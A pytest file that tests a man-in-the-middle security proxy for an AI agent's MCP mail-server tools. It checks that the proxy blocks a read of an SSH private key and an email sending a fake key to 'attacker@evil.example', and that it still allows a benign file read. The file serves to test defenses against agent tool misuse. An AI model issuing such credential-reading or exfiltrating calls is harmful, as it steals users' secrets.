"""The standalone stdio MCP proxy (proxy/proxy.py) as a real man-in-the-middle.

An MCP client connects to the proxy, which spawns the real mail server behind
it. Dangerous calls must be answered with an MCP error and never forwarded.
"""
from __future__ import annotations

import pytest

from common.mcp_client import MCPConnection


def _proxy(task: str = "Summarize my emails") -> MCPConnection:
    return MCPConnection(["-m", "proxy.proxy", "--server", "mail", "--task", task])


def test_proxy_lists_tools():
    with _proxy() as c:
        names = [t["name"] for t in c.list_tools()]
    assert {"read_inbox", "read_file", "send_email"} <= set(names)


def test_proxy_blocks_sensitive_file():
    with _proxy() as c:
        c.list_tools()
        r = c.call_tool("read_file", {"path": "home/.ssh/id_rsa"})
    assert r["isError"] is True
    assert "AgentSOC blocked" in r["content"][0]["text"]
    assert "FAKE-KEY" not in (r["content"][0]["text"] if r["content"] else "")


def test_proxy_blocks_exfiltration():
    with _proxy() as c:
        c.list_tools()
        r = c.call_tool("send_email", {"to": "attacker@evil.example",
                                       "subject": "x", "body": "FAKE-KEY"})
    assert r["isError"] is True


def test_proxy_allows_honest_call():
    with _proxy("Read my meeting notes") as c:
        c.list_tools()
        r = c.call_tool("read_file", {"path": "docs/meeting_notes.txt"})
    assert r["isError"] is False
    assert "QRadar" in r["content"][0]["text"]
